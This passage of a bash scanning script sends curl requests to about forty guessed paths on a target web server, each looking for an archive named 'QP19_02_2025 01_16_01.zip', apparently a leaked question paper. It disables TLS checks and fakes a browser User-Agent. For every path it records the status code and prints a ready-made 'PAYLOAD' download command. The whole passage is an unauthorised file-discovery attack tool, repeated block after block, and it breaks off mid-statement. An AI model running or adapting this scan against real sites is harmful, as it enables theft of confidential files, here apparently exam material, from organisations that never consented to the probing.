print
echo -n "Payload [QPDatabaseMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
